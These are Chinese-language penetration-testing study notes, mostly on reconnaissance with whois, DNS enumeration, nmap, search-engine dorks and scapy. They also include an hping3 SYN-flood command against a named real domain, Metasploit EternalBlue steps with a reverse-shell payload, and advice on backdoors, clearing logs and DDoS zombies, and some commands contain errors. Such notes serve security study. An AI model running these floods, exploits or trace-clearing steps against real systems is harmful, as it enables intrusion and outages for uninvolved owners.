# 网络安全攻防(挂多重代理or使用隧道or使用受控电脑练习)

```shell
1.渗透测试
渗透测试指的是在目标系统授权的情况下，采取可控的入侵手法，
模拟真实攻击者使用的各种方法和技术，绕过系统的防护措施(权限控制、加密、完整性、可靠性等)，
以检验系统在真实环境中的安全性,发现漏洞，达到保护重要资产的目的。

2.渗透测试的对象
网络硬件设备
主机操作系统
应用系统
数据库系统

3.
```

# 1.攻击的大体流程

```
1.确定目标
在立项会议中，
确定范围：ip,域名，内外网，
确定规则：渗透到什么程度，攻击时间，可以采取哪些攻击手段？
确定需求：web应用漏洞？业务逻辑漏洞？人员管理权限漏洞？
2.信息搜集
攻击方式：主动扫描？开放式的搜索？
需要的基础信息：IP，业务架构，域名，端口，各种系统依赖的版本信息，应用信息。
3.漏洞探测
4.漏洞验证
对上一步扫描的漏洞，进行验证。
自动化验证：通过工具进行验证。
手动验证：
暴力破解：
5.信息分析
为下一步的渗透测试做准备，精准打击，绕过机制，攻击代码。
6.获取所需
进行攻击，脱库，持续性存在(留后门)，清理痕迹。
7.信息整理
整理整个渗透过程中使用到的工具，收集到的结果信息，漏洞信息等等。
8.报告撰写
去百度搜一些模板。
列出当前系统存在的漏洞信息-漏洞出现的原理-通过什么方式可以利用-给出整改建议。
```

## 1.1 确定目标: 确定目标地址范围: 信息收集

```python
信息内容
    网站whois信息
    天眼查,ICP编号,国家企业信息公示系统
    收集该网站的子域名等
    通过网站是http/https来进行SSL证书的查询
    收集Ip网段(需要注意CDN加速时可能获取的是CDN厂商的ip)
    开放端口探测(21,22,23,3306,6379,80,8080等等)
    网站框架
        可通过chrome插件,firefox插件查看
        该网站的招聘信息推断其使用的技术
    敏感文件/目录探测
    WAF
先用扫描器扫描
    IBM(AppScan)
    HP(WebInspect)
    启明星辰(天镜)
    安恒(明鉴)
    绿盟(WVSS/RSAS)
    其他, 如NMAP等等
DNS域传送漏洞(域名探测过程)
根据主域名,可以获得二级,三级域名
    通过kali内置的枚举器dnsenum来获取
        1.root用户登录
        2.dnsenum命令
            dns -f /usr/share/dnsenum/dns.txt
            dns --dnsserver 114.114.114.114
        主要目的
            收集了dns域名信息
            发现了对应的端口信息(80,443)
            发现子域名及对应端口 
            DNS域名的注册信息
            DNS服务器区域传输
            A, NS, MX记录
            Bind版本号 区域传输
        字典爆破
            dns -f /usr/share/dnsenum/dns.txt
        正向解析
            根据域名找ip
        反向解析
            根据ip找域名(dig或者nslookup)
        示例; dnsenum www.fda.gov
    通过whois查看注册信息
        示例: whois google.com
    通过nslookup
        示例: nslookup www.google.com
    dig
        示例: dig @114.114.114.114 fda.gov any
        示例: dig +noall +answer -x 114.114.114.114
        示例: dig +trace fda.gov
网站的备案信息(ICP备案信息查询)
    如站长工具来查询
网站SSL信息
    也可以通过站长工具来查询
APP信息提取
    抓包工具抓包
    安卓app反编译
暴力破解
    二级域名的暴破, 如demon v1.2工具
DNS更新记录解析
    www.dnsdb.io
第三方网站的搜集工作
    漏洞银行
    360威胁情报中心
    钟馗之眼
    zoomeye.org
    github
    天眼查
    微步在线
    google
信息整理
    指纹识别
    waf(web防火墙)
    cdn
```

## 1.2 2.方法->踩点->扫描->查点->访问->提权_>获取信息->湮灭踪迹(history信息)-->创建后门(下次再来)-->启动一个僵尸进程以备不时之需(如DDos)

## 1.3 需要的技术

```python
踩点(whois)
扫描(ping等)
查点(SNMP等)
访问(密码嗅探)
提权(密码提权)
获取信息(如配置文件中的明文密码)
创建后门(各种木马病毒等等)
湮灭踪迹(清楚各种日志,history清理,自己放置的工具加壳)
```

## 1.4 需要的工具

```python
kali
google
ping,fping,nmap,autoscan
```

# 2.敏感信息搜集(挂多重代理or使用隧道or使用受控电脑练习)

## 2.1 信息来源

```python
1.参看:<<网络安全工具_环境_资源.md>>

2.web源代码泄漏
gitlab
svn
.DS_Store文件泄漏
WEB-INF/web.xml文件泄漏
网络备份文件泄漏:.tar.gz, .zip, .rar.等文件
github泄漏
开源
    配置信息
    邮箱信息
代码层面
    接口信息泄漏(未能较好的鉴权, 被随意调用)

3.社会工程学信息泄漏
利用社会工程库获取用户对应的密码进行攻击
社交软件:qq,微信,微博,知乎,脉脉等
微信伪造
任意邮箱发送
临时邮箱发送
邮箱池群
百度网盘破解

4.历史漏洞!!!!!
历史漏洞!!!!未必修复了!!!

5.常见的web服务器(处理http/https请求)
IIS:windows server 下提供web服务
apache"可以在windows,mac,linux下跑
nginx
tomcat
jboss
weblogic
websphere
```

## 2.2 资产梳理的步骤

```shell

```

### 2.2.1 信息搜集

```python
一.DNS枚举工具
1.获取域名,子域名等
2.根据域名以及相关信息判定存活的域名
3.获取存活的域名的ip地址(注意cdn获取的不是目的公司的ip而是cdn厂商的ip)
4.根据ip地址的分布, 确定企业的公网网段
如果最终能获取到企业的CMDB系统, 那就省很多事儿
dnsenum --enum fda.gov(使用这个命令需要vpn)
fierce --domain baidu.com

二.测试网络的范围
dmitry -wnpb www.qoo10.sg

dmitry [-winsepfb] [-t 0-9] [-o %host.txt] host

-o 将输出保存到％host.txt或由-o文件指定的文件
-i 对主机的IP地址执行whois查找
-w 对主机的域名执行whois查找
-n 在主机上检索Netcraft.com信息
-s 执行搜索可能的子域
-e 执行搜索可能的电子邮件地址
-p 在主机上执行TCP端口扫描
-f 在显示输出报告过滤端口的主机上执行TCP端口扫描
-b 读取从扫描端口接收的banner
-t 0-9扫描TCP端口时设置TTL（默认为2） 作者：Kali与编程 https://www.bilibili.com/read/cv5761879/


三.测试网络的范围
netmask -s fda.gov

四.查看指定网段内的存活主机及存活的端口
nmap -sP 192.168.13.0/24(同时返回了mac地址)
nmap 192.168.122.1(直接扫描指定主机的开放端口)
nmap -p22-80 192.168.122.1(直接扫描指定主机的固定范围端口是否开放)

五.识别系统指纹
nmap -O 192.168.122.1 (同时列举出了所有开放的端口)
nmap -O -p9091 192.168.122.1 (指定端口)

六.服务的指纹识别
nmap -sV 192.168.122.1 
amap -bg 192.168.122.1 22-8080

七.发现网段内的网络主机
netdiscover

八.其他信息扫描
maltego(画网络结构图)

九.目标网站分析
判断网站指纹信息(使用的开发框架，编程语言，官方技术岗位招聘需求)
根据使用的技术搜索技术对应的历史漏洞尝试攻击

十.分类
1) 主动信息搜集
需要与目标机器进行直接的交互，比如 nmpa, scapy
缺点：容易被目标机器记录操作信息或者屏蔽。
优点：搜集的信息基本都是准确的。
2) 被动信息搜集
不需要与目标机器进行直接的交互，主要利用第三方站点或其他渠道进行信息搜集，
比如google,shodan,fofa

十一.搜集内容
ip地址，域名，子域名，邮件地址，公司地址，招聘信息(推测技术栈)，公司组织架构，
端口信息，敏感信息
```

#### 2.2.1.1 域名及其子域名的搜集

```shell
1.查询域名的备案信息及注册信息
1.1 命令查询：注意要是顶级域名
whois espacenet.com
1.2 站长之家等在线查询

2.使用Maltego收集子域名信息(需要会科学上网)
该工具的主要重点是分析通过互联网访问的数据之间的真实世界关系，
其中包括足迹互联网基础设施和收集有关拥有该网络的人员和组织的数据。
通过使用OSINT(开源情报）技术，通过查询whois记录，社交网络，DNS记录，
不同的在线API，提取元数据和搜索引擎来搜索这些数据之间的连接。
该工具将提供广泛的图形布局结果，允许对数据进行聚类，使关系准确和即时。
2.1 挖掘子域名的重要性
子域名是某个主域的二级域名或者多级域名，在防御措施严密情况下无法直接拿下主域，
那么就可以采用迂回战术拿下子域名，然后无限靠近主域。

2.2 挖掘子域名的工具
子域名挖掘工具:Maltego子域名挖掘机。
搜索引擎挖掘如:在Google中输入site:qq.pome
第三方网站查询: http://tool.chinaz.com/subdomain、https://dnsdumpster.com/
证书透明度公开日志枚举: https://crt.sh/ . http://censys.io/
其他途径: https://phpinfo.me/domain . http://dns.aizhan.com
subDomainBrute: 
Layer子域名挖掘机：(可以从github上更新字典)
Layer子域名挖掘机是一款域名查询工具，可提供网站子域名查询服务;
拥有简洁的界面、简单的操作模式，支持服务接口、暴力搜索、同服挖掘三种模式，
支持打开网站、复制域名，复制IP、复制CDN.
导出域名、导出IP、导出域名+IP、导出域名+IP+WEB服务器以及导出存活网站。
https://www.bilibili.com/read/cv8551846/

2.3 
```

#### 2.2.1.2 IP地址信息的搜集

```shell
1.IP反查域名
如果渗透目标为虚拟主机，那么通过IP反查到的域名信息很有价值，
因为一台物理服务器上面可能运行多个虚拟主机。
这些虚拟主机有不同的域名，但通常共用一个IP地址。
如果你知道有哪些网站共用这台服务器，就有可能通过此台服务器上其他网站的漏洞
获取服务器控制权，进而迂回获取渗透目标的权限，这种技术也称为“旁注”。
反查域名网站
https://stool.chinaz.com/same
https://tools.ipip.net/
1.1 dig 命令
在kali上执行 dig -x 114.114.114.114 命令

2.域名/子域名查IP
https://ip.tool.chinaz.com/
2.1 nslookup 命令
在kali上执行 nslookup worldwide.espacenet.com 命令
2.2 dig 命令
在kali上执行 dig www.baidu.com any 命令

3.CDN问题
#1.多地ping，判断是否开启CDN
https://ping.chinaz.com/ (国内多地Ping)
https://asm.ca.com/en/ping.php (国外多地ping)
#2.绕过CDN
》》查看phpinfo文件，jsp相关文件，tomcat相关信息等
》》Mx记录：查看邮箱邮件原文
邮箱里的邮件原文信息会展示Ip地址信息，如果和web服务器架设在同一台机器上，可以进行猜解。
》》查询历史DNS记录
https://dnsdb.io/zh-cn
https://securitytrials.com
https://x.threadbook.cn
#A记录(正向解析: 域名-->ip):
将域名指向一个IPv4地址（例如∶100.100.100.100），需要增加A记录NS
#PTR记录(Pointer)反向解析(ip --> 域名)
PTR记录将一个IP地址对应到主机名（全称域名FQDN)。这些记录保存在in-addr.arpa域中。
#NS记录：
域名解析服务器记录，如果要将子域名指定某个域名服务器来解析，需要设置NS记录SOA
#SOA记录：
SOA叫做起始授权机构记录，NS用于标识多台域名解析服务器，
SOA记录用于在众多NS记录中标记哪—台是主服务器MX
#MX记录:
建立电子邮箱服务，将指向邮件服务器地址，需要设置MX记录。
建立邮箱时，一般会根据邮箱服务商提供的MX记录填写此记录.
#TXT记录:
可任章填写，可为空。一般做一些验证记录时会使用此项，如:做SPF(反垃圾邮件）记录
#AAAA记录
用来指定主机名(或域名）对应的IPv6地址（例如: ff06:0:0:0:0:0:0:c3）记录。
#CNAME记录：
如果需要将域名指向另一个域名，再由另一个域名提供ip地址，就需要添加CNAME记录。
#SRV记录
记录了哪台计算机提供了哪个服务。格式为:服务的名字、点、协议的类型，
例如:_xmpp-server._tcp。

4.C段存活主机探测(比如，192.169.1.0-192.168.1.255 属于同一C段)
nmap -sP www.xxx.com/24 || nmap -sP 192.168.1.*
https://github.com/se55i0n/Cwebscanner


探测存活主机
nmap -sn -v -T4 -oG Discovery.anmap 172.26.1.0/24
grep "Status: Up" Discovery.anmap / cut -f 2 -d ' ' > liveHosts.txt
```

#### 2.2.1.3 端口信息的搜集

```shell
1.什么是端口
在Internet上，各主机间通过TCP/IP协议发送和接受数据包，
各个数据包根据其目的主机的IP地址来进行互联网络中的路由选择，
从而顺利的将数据包顺利的传送给目标主机。

2.协议端口
根据提供服务类型的不同，端口可分为以下两种:
TCP端口:TCP是一种面向连接的可靠的传输层通信协议。
UDP端口:UDP是一种无连接的不可靠的传输层协议。
TCP协议和UDP协议是独立的，因此各自的端口号也互相独立。

3.端口类型
周知端口:众所周知的端口号，范围:0-1023，如80端口是www服务
动态端口:一般不固定分配某种服务，范围:49152-65535
注册端口:范围:1024-49151，用于分配给用户进程或程序

4.FTP-21端口
FTP:文件传输协议，使用TCP端口20、21，20用于传输数据，21用于传输控制信息
(1) ftp基础爆破: owasp的Bruter,hydra以及msf中的ftp爆破模块。
(2) ftp匿名访问:用户名: anonymous密码:为空或者任意邮箱。
(3) vsftpd后门: vsftpd 2到2.3.4版本存在后门漏洞，通过该漏洞获取root权限。
(4) 嗅探: ftp使用明文传输，使用Cain进行渗透。(但是嗅探需要在局域网并需要欺骗或监听网关)
(5) ftp远程代码溢出。(6) ftp跳转攻击。

5.SSH-22
SSH: (secure shell)是目前较可靠，专为远程登录会话和其他网络服务提供安全性的协议。
(1）弱口令，可使用工具hydra,msf中的ssh爆破模块。
(2)SSH后门
(3) openssh 用户枚举CVE-2018-15473。

6.Telnet-23
Telnet协议是TCP/IP协议族中的一员，是Internet远程登录服务的标准协议和主要方式。
(1）暴力破解，使用hydra,或者msf中telnet模块对其进行破解。
(2)在linux系统中一般采用SSH进行远程访问，传输的敏感数据都是经过加
密的。而对于windows下的telnet来说是脆弱的，因为默认没有经过任何加密就在网络中进行
传输。使用cain等嗅探工具可轻松截获远程登录密码。

7.SMTP-25/465
smtp:邮件协议，在linux中默认开启这个服务，可发送钓鱼邮件。
默认端口:25 (smtp).465 (smtps)
(1）爆破:弱口令，使用hydra
(2)SMTP无认证伪造发件人

8.www-80
为超文本传输协议(HTTP)开放的端口，主要用于万维网传输信息的协议
(1）中间件漏洞，如IIS、apache、nginx等
(2）80端口一般通过web应用程序的常见漏洞进行攻击

9.NetBIOS SessionService-139/445
139用于提供windows文件和打印机共享及UNIX中的Samba服务。
445用于提供windows文件和打印机共享
(1）对于开放139/445端口，尝试利用MS17010溢出漏洞进行攻击;
(2）对于只开放445端口，尝试利用MSO6040、MS08067溢出漏洞攻击;
(3）利用IPC$连接进行渗透

10.MySQL-3306
3306是MYSQL数据库默认的监听端口
(1) mysql弱口令破解
(2）弱口令登录mysql，上传构造的恶意UDF自定义函数代码，
通过调用注册的恶意函数执行系统命令
(3)SQL注入获取数据库敏感信息，load_file()函数读取系统文件，导出恶意代码到指定路径

11.RDP-3389
3389是windows远程桌面服务默认监听的端口
(1)RDP暴力破解攻击
(2)MS12_020死亡蓝屏攻击
(3)RDP远程桌面漏洞（CVE-2019-0708)
(4)MSF开启RDP、注册表开启RDP

12.Redis-6379
开源的可基于内存的可持久化的日志型数据库。
(1）爆破弱口令
(2) redis未授权访问结合ssh key 提权。
(3）主从复制rce。

13.Weblogic-7001
(1)弱口令、爆破，弱密码一般为weblogic/Oracle@123 or weblogic
(2）管理后台部署war包后门
(3) weblogic SSRF
(4）反序列化漏洞

14.Tomcat-8080
(1) Tomcat远程代码执行漏洞(CVE-2019-0232)
(2)Tomcat任意文件上传(CVE-2017-12615)
(3) tomcat管理页面弱口令getshell

15.NMAP扫描基础用法
nmap -A -T4 192.168.13.1
-A：全盘扫描
-T: 时序选项
-T0(偏执的):非常慢的扫描,用于IDS逃避.
-T1(鬼崇的):缓慢的扫描,用于IDS逃避.
-T2(文雅的):降低速度以降低对带宽的消耗,此选项一般不常用。
-T3(普通的):默认,根据目标的反应自动调整时间.
-T4(野蛮的):快速扫描,常用扫描方式,需要在很好的网络环境下进行扫描,请求可能会淹没目标.
-T5(疯狂的):急速扫描,这种扫描方式以牺牲准确度来提升扫描速度.

#单一主机扫描: 
namp 192.168.1.2
#子网扫描: 
namp 192.168.1.1/24
#多主机扫描: 
nmap 192.168.1.1 192.168.1.10
#主机范围扫描: 
namp 192.168.1.1-100
#IP地址列表扫描: 
nmap -iL target.txt
#扫描除指定IP外的所有子网主机:
nmap 192.168.1.1/24 --exclude 192.168.1.1
#扫描除文件中IP外的子网主机:
nmap 192.168.1.1/24 --excludefile xxx.txt
#扫描特定主机上的80,21,23端口:
nmap -p 80,21,23 192.168.1.1
#扫描全部端口
nmap -sS -v -T4 -Pn -p 0-65535 -oN FullTCP -iL liveHosts.txt
#扫描常用端口及服务信息
nmap -sS -T4 -Pn -oG TopTCP -iL LiveHosts.txt
#系统扫描
nmap -O -T4 -Pn -oG OSDetect -iL LiveHosts.txt
#版本检测
nmap -sV -T4 -Pn -oG ServiceDetect -iL LiveHosts.txt

16.端口的状态
open: 表示端口开放
filterd：表示端口被防火墙或安全软件阻止了
closed: 表示端口关闭

17.绕过防火墙
-PS 选项来实施TCP SYN ping可绕过防火墙
-PA 这种类型的扫描将只会扫描ACK包，可绕过防火墙
-PU 扫描只会对目标进行udp ping 扫描。
这种类型的扫描会发送UDP包来获取一个响应，可绕过防火墙
-PP 选项进行一个ICMP时间戳ping扫描，可绕过防火墙
-PE 参数进行一个IEMP(Internet控制报文协议)在指定的系统上输出ping，可绕防火墙
-Pn 不采用ping方式进行扫描，可绕过防火墙。
-sA 用于发现防火墙规则，比如扫到的端口是过滤的，那么可以使用这个参数进行绕过。
```

#### 2.2.1.4 网站信息收集

```shell
1.网站指纹识别
网站的最基本组成:服务器（操作系统)、中间件(web容器）、脚本语言、数据库
为什么要了解这些?举个例子：
发现了一个文件读取漏洞，我们需要读/etc/passwd，如果是windows系统根本不会存在这个文件
1.1 判别操作系统
#ping判断: 
windows的TTL值一般为128，Linux则为64。
TTL大于100的一般为windows，几十的一般为linux。
#nmap -O参数
#windows大小写不敏感，linux则区分大小写
1.2 判别网站服务\容器类型
#F12查看响应头Server字段
#whatweb
https://www.whatweb.net/
#wappalyzr插件
1.3 判别脚本类型
php，jsp, asplaspx,python
1.4 判别数据库类型
mysql , sqlserver,access,oracle
1.5 常见CMS识别
常见CMS: dedecms(织梦)、Discuz、phpcms等。
#在线识别工具
http://whatweb.bugscaner.com/look/
#Onlinetools
https://github.com/iceyhexman/onlinetools
https://pentest.gdpcisa.orgl


2.敏感文件，目录探测
github
git
svn
.DS_Store.hg
.bzrcvs
WEB-INF
备份文件
2.1 github泄露
2.2 git泄露
chrome搜索 ".git" intitle:"index of "
然后根据.git文件，参考 https://github.com/lijiejie/GitHack来clone完整代码
2.3 .svn泄露
chrome搜索 ".svn" intitle:"index of "
然后根据.svn文件，参考 https://github.com/admintony/svnExploit来clone完整代码
2.4 WEB_INF/web.xml文件泄露
WEB-INF是Java的WEB应用的安全目录。如果想在页面中直接访问其中的文件，
必须通过web.xml文件对要访问的文件进行相应映射才能访问
2.5 网站备份文件泄露
指管理员误将网站备份文件或是敏感信息文件存放在某个网站目录下。
https://github.com/7kbstorm/7kbscan-WebPathBrute
2.6 目录探测
#dirsearch: 
https://github.com/maurosoria/dirsearch
#dirmap:
https://github.com/H4ckForJob/dirmap
#御剑后台扫描工具

3.waf识别
WAF，即: Web Application FireWall (Web应用防火墙)。
可以通俗的理解为:用于保护网站，防黑客、防网络攻击的安全防护系统;
是最有效、最直接的Web安全防护产品。

3.1 Waf功能
(1)防止常见的各类网络攻击，如:SQL注入、XSS跨站、CSRF、网页后门等;
(2）防止各类自动化攻击，如:暴力破解、撞库、批量注册、自动发贴等;
(3)阻止其它常见威胁，如:爬虫、O DAY攻击、代码分析
嗅探、数据篡改、越权访问、敏感信息泄漏、
应用层DDOS、远程恶意包含、盗链、越权、扫描等。

3.2 waf指纹识别
wafw00f
https://github.com/EnableSecurity/wafwOOf
nmap -p80,443 --script http-waf-detect ip
nmap -p80,443 --script http-waf-fingerprint ip
```

#### 2.2.1.5 其他信息收集

```shell
1.历史漏洞信息收集
http://wy.zone.ci/
https://wooyun.kieran.top/#!/
https://www.exploit-db.com/
https://wiki.O-sec.org/
https://www.seebug.org

2.社会工程学

3.
```

#### 2.2.1.6 基于ping命令的探测(三层发现)

```shell
PING命令是我们常用的判断主机之间网络是否畅通，同样也是能判断我们的目标主机是否存活。
一般使用IP，ICMP协议。
ping 192.168.13.1

#优点
可以经过路由的主机，速度相对较快
#缺点
速度比二层发现慢，经常会被防火墙拦截

我们从当前主机到目标主机之间肯定要经过很多网络设备，
我们怎么才能知道中间经过了哪些网络设备？
traceroute worldwide.espacenet.com
如果响应结果是一堆星号，说明被屏蔽了。
```

#### 2.2.1.7 基于arping/netdiscover命令的探测(二层发现)

```shell
#ARP协议概述:
ARP协议是“Address Resolution Protocol”(地址解析协议）的缩写。
计算机通过ARP协议将IP地址转换成MAC地址。

#ARP协议工作原理
在以太网中，数据传输的目标地址是MAC地址，一个主机要和另一个主机进行直接通信，
必须要知道目标主机的MAC地址。

计算机使用者通常只知道目标机器的IP信息，
“地址解析”就是主机在发送帧前将目标IP地址转换成目标MAC 地址的过程。

简单地说，ARP协议主要负责将局域网中的32位IP地址转换为对应的48位物理地址，
即网卡的MAC地址，保障通信顺利进行。

#使用arping命令查看局域网中的IP是否有冲突
arping 192.168.13.1 -c 1 
(如果只看到一行记录，说明该ip没有冲突，否则说明可能冲突或有人冒充该IP)

我们发现 arping只能对一个ip地址进行判断，
这个时候我们就需要通过脚本来实现对网络的自动扫描。

#使用netdiscover进行被动方式探测局域网中存活的机器
netdiscover是一个主动/被动的ARP侦查工具。
使用netdiscover工具可以在网络上扫描IP地址，检查在线主机或搜索为它们发送的ARP请求。
> 主动模式(速度快): netdiscover -i eth0 -r 192.168.13.0/24
主动模式顾名思义就是主动的探测发现网络内主机，但是这种方式往往会引起网络管理员的注意
> 被动模式(速度慢): netdiscover -p
被动模式的方法更加隐蔽，但是速度会比较慢，
网卡被设置为混杂模式来侦听网络内的arp数据包进行被动式探测，
这种方式就需要网络内设备发送arp包才能被探测到。

#优点
扫描速度快，可靠性高
#缺点
不可路由
```

#### 2.2.1.8 基于HPING3命令的探测

```shell
#概述
hping3是一个命令行下使用的TCP/IP数据包组装/分析工具，
通常web服务会用来做压力测试使用，也可以进行DOS攻击的实验。
同样Hping3只能每次扫描一个目标。

#进行压力测试(不要随意发送，)
hping3 -c 1000 -d 120 -S -w 64 -p 443 --flood --rand-source worldwide.espacenet.com
```

#### 2.2.1.9 基于FPING命令的探测

```shell
使用FPING查看局域中运行了哪些机器。
Fping就是ping命令的加强版他可以对一个IP段进行ping扫描，
而ping 命令本身是不可以对网段进行扫描的。

fping -g 192.168.13.0/24 -c 1 > f1.txt
```

#### 2.2.1.10 使用scapy定制数据包进行高级扫描

```shell
Scapy是一个可以让用户发送、侦听和解析并伪装网络报文的Python程序。
这些功能可以用于制作侦测、扫描和攻击网络的工具。

1.在kali中输入scapy，进入交互界面

2.例:定义向192.168.13.1发送arp请求的数据包
我们使用ARP().display()来查看ARP函数的用法。
输入ARP().display()查看
  hwtype= 0x1 (表示硬件类型)
  ptype= IPv4 (表示协议类型)
  hwlen= None (硬件地址长度，MAC)
  plen= None  (协议地址长度，IP)
  op= who-has (who-has查询)
  hwsrc= 00:0c:29:da:43:30 (源MAC地址)
  psrc= 192.168.13.128 (源IP地址)
  hwdst= 00:00:00:00:00:00 (目标MAC地址)
  pdst= 0.0.0.0 (向谁发送请求)
#定义向192.168.13.1发送arp请求的数据包
sr1函数作用:sr1函数包含了发送数据包和接收数据包的功能。
sr1(ARP(pdst="192.168.13.1"))

3.例:定义向192.168.13.1发送ping请求的数据包(走的是IP/ICMP协议)
我们使用ICMP().display()来查看ICMP函数的用法。
  type= echo-request (区分数据包的类型)
  code= 0 (代码)
  chksum= None (校验和，对数据包完整性进行校验)
  id= 0x0 (不同的ping进程)
  seq= 0x0 (子进程下第几个Ping包)
我们使用IP().display()来查看IP函数的用法。
  version= 4 (版本，即IPV4)
  ihl= None (首部长度)
  tos= 0x0 (服务)
  len= None(总长度)
  id= 1(标识)
  flags= ()
  frag= 0(标志)
  ttl= 64(生存时间)
  proto= hopopt(传输控制协议，IPV6Z逐跳选项)
  chksum= None(首部校验和)
  src= 127.0.0.1(源IP地址)
  dst= 127.0.0.1(目标IP地址)
  \options\()
注:IP()生成ping包的源IP和目标IP ，ICMP()生ping包的类型。
使用IP()和ICMP()两个函数，可以生成ping包，进行探测。
#思路:
1、修改IP包头的dst，也就是我们的目的地址
2、拼接上ICMP的数据包类型
3、使用sr1()进行发送数据包并接收数据包
sr1(IP(dst="10.102.224.206")/ICMP(),timeout=1)

4.TCP函数
我们使用TCP().display()来查看TCP函数的用法。
  sport= ftp_data(TCP源端口)
  dport= http(TCP目的端口)
  seq= 0(32位序号)
  ack= 0(32位确认序号)
  dataofs= None(4位首部长度)
  reserved= 0(保留6位)
  flags= S(标志域，
紧急标志、有意义的应答标志、推、重置连接标志、同步序列号标志、完成发送数据标志。
按照顺序排列是:URG、ACK、PSH、RST、SYN、FIN)
  window= 8192(窗口大小)
  chksum= None(16位校验和)
  urgptr= 0(优先指针)
  options= [](选项)
注:这种基于tcp的半链接扫描,更隐密，更不容易被发现。
sr1(IP(dst="10.102.224.206")/TCP(flags="S",dport=9093),timeout=1)
```

#### 2.2.1.11 shodan搜索引擎使用方法

```shell
xxx
```

#### 2.2.1.12 google搜索引擎使用方法

```shell
使用Google等搜索引擎可以对某些特定的网络(主机服务器)，
通常是服务器上的脚本漏洞，进行搜索。
以达到快速找到漏洞主机或特定的主句的漏洞的目的。
Google搜索引擎毫无疑问是当今世界上最强大的搜索引擎。
google黑客语法数据库：
https://www.exploit-db.com/google-hacking-database

关键词:
>> inurl
inurl 用于搜索网页上包好的URL，这个语法对于寻找网页上的搜素、帮助之类的是很好用的。
inurl:php?id=

>> intext
intext只搜索网页部分中包含的文字(忽略了标题URL等的文字)

>> site
site 可以限制你搜索范围的域名
site:qq.com

>> filetype
filetype搜索文件的后缀名或扩展名

>> intitle
intitle 限制你搜索的网页标题
intitle:管理|后台|登录|用户名|密码

>> allintitle
allintitle 搜索所有关键字构成标题的网页，但是推荐尽量少用。

>> link
link可以得到一个包含指定某个URL的页面列表.

>> info
查找指定站点信息

>> cache
搜索google里面的内容缓存

>> related
related:www.tsinghua.edu.cn (查找同类型的相关网站：这里指的是布局相似的网站)

>> -关键字
不希望搜索结果中出现包含该关键字的网页

例子:
1.link:www.google.com, 可以查询所有链接到谷歌的页面列表
2.site:www.google.com filetype:xls
3.site:www.google.com admin
4.site:www.google.com login
5.site:www.google.com system
6.site:www.google.com 管理
7.site:www.google.com email
8.intext:管理
9.filetype:mdb
10.site:www.google.com filetype:jsp qq
11.site:www.google.com filetype:jsp?id=
12.site:tw www.google.com inurl:file
13.site:qq.com inurl:file 在指定域名中寻找文件上传页面
14.site:qq.com inurl:load 在指定域名中寻找文件上传页面
15.site:xx.com inurl:robots.txt 搜索重要文件
16.site:xx.com inurl:txt 搜索重要文件
17.吉明泽步 filetype:torrent 搜索重要文件
18.intext:user.sql intitle:index.of 查询包含user.sql用户数据库信息的处于开放状态的页面
19.
```

#### 2.2.1.13 FOFA搜索引擎使用方法

```shell
FOFA是白帽汇推出的一款网络空间搜索引擎，它通过进行网络空间测绘，
能够帮助研究人员或者企业迅速进行网络资产匹配，
例如进行漏洞影响范围分析、应用分布统计、应用流行度排名统计等。
https://fofa.info/
https://fofa.so
```

#### 2.2.1.14 openwebsearch

```shell
https://openwebsearch.eu
```

#### 2.2.1.15 钟馗之眼

```shell
xx
```

### 2.2.2 漏洞扫描

```python
漏洞扫描是指基于漏洞数据库，通过扫描等手段对指定的远程或者本地计算机系统的安全脆弱性进行检测，
发现可利用漏洞的一种安全检测（渗透攻击)行为。

#常见漏洞扫描工具
网络上公布的付费的或者免费的漏洞扫描工具、脚本多种多样。
√针对某类漏洞的: sql注入(sqlmap) . weblogic (weblogicscan)
√针对某类CMS的: wordpress (wpscan) . dedecms (dedecmsscan)
√针对系统应用层: nessus
√针对某类框架的: Struts2 (Struts2漏洞检查工具)、springboot (SB-Actuator)


详见下文，这里可以使用metasploit,nessus,xray等

一.msf使用
msfconsole
```

### 2.2.99 永恒之蓝漏洞利用

```python
1.msfconsole
2.search ms17-010
3.找到 auxiliary/scanner/smb/smb_ms17_010 这个scanner对应的编号，这里是3。
执行命令：use 3
4.set payload windows/x64/meterpreter/reverse_tcp
5.show options
6.set rhosts 192.168.13.1(目标ip)
7.set lhosts 192.168.13.128(kali本机Ip)
8.
9.set lport 444(kali本机Port)
10.run
11.
12.
https://blog.csdn.net/qq_46202048/article/details/121535176
```

[经典利用永恒之蓝漏洞对Windows操作系统进行攻击_do you best的博客-CSDN博客_永恒之蓝端口](https://blog.csdn.net/qq_46202048/article/details/121535176)

# 3.漏洞扫描技术

```python
web渗透扫描
系统渗透扫描
burp工具以及漏洞扫描报告编写
```

## 3.1 扫描技术概述

### 3.1.1 漏洞扫描的基本原理

```
1.链路检测扫描(ping)
利用ping命令进行扫描时，会先检查网络的连通性，然后根据测试扫描后的TTL值的输出，判断所扫描的系统类型。
TTL=64，可能是windows7/2008 linux系统
TTL=128，可能是windows xp/2000/2003系统
TTL=255，可能是交换机或者路由设备

2.端口扫描检测(telnet)
利用telnet命令进行扫描时，会检测网络的端口是否开放，根据输出的信息即可判断。
成功连接：表示对方已开启FTP服务。


扫描器的运作原理是基于TCP/IP的，个人计算机，服务器主机或者防火墙和路由器都适用。
扫描信息的来源基本必须依赖于端口，即必须某端口对外开放，才可以由此判断主机上运行的操作系统类型，
服务软件类型及版本。

3.OS检测扫描
OS扫描是黑客进行OS漏洞攻击的前奏，实时检测OS扫描是防止系统遭受OS漏洞攻击的重要手段。
利用nmap命令进行测试扫描检测网络系统信息时，使用TCP/IP协议栈指纹来识别不同操作系统和设备。
在RFC规范中，有些地方对TCP/IP的实现并没有强制规定。由此不同的TCP/IP方案中可能有自己的特定方式。
nmap主要是根据这些细节上的差异来判断操作系统的类型的。
>> nmap内部包含了2600多个已知系统的指纹特征(在文件nmap-os-db文件中记录)。将此指纹数据作为指纹对比的样本库。
>> 分别挑选一个open和closed的端口，向其发送经过精心设计的TCP/UDP/ICMP数据包，根据返回的数据包生成一份系统指纹。
>> 将探测生成的系统指纹与nmap-os-db中指纹进行对比，查找匹配的系统。如果无法匹配，则以概率形式列出可能的系统。

4.弱口令探测
尝试安全性差的系统信息。
一般的都是采用琼剧破解原理，或者是利用字典文件加快破解速度，对常见的弱口令的搜集。

5.漏洞评估检测
对已知的各种漏洞进行检测，已成为当今动态威胁态势下的主流安全实践。
利用漏洞扫描器，无论是针对网络的，应用的还是数据库的，对很多大型终端用户公司而言早已是标准规程。
漏洞评估的目标，是识别和量化环境中的安全漏洞。
现有软件扫描器可用来评估公司企业的安全态势，识别已知安全空白，提出恰当的风险缓解动作建议。
要么清除干净，要么降低风险。
```

### 3.1.2 扫描技术分类信息

```
1.开放扫描
1.1 TCP全连接
